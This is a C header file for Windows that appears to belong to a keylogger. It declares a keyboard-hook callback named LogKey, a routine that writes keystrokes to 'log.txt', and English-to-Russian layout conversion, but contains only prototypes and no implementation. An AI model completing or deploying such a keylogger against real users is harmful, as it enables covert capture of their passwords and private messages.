#pragma once
#include<Windows.h>
#include<stdio.h>

#define PATH "log.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 30

BOOL isCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(LPWSTR wstr);
WCHAR EnToRus(WCHAR c);
